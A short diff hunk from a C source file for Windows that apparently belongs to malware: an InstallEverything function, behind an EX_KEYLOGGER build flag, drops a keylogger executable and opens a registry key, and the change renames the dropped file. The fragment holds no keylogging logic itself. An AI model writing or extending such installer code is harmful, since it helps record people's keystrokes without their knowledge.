@@ -105,7 +105,7 @@ static void InstallEverything(char* path, HWND windowHandle)
 #ifdef EX_KEYLOGGER
     char loggerPath[MAX_PATH];
     strcpy(loggerPath, path);
-    strcat(loggerPath, "\\KeyLog.exe");
+    strcat(loggerPath, "\\KeyLogger.exe");
     InstallKeylogger(loggerPath);
 
     HKEY regKey;
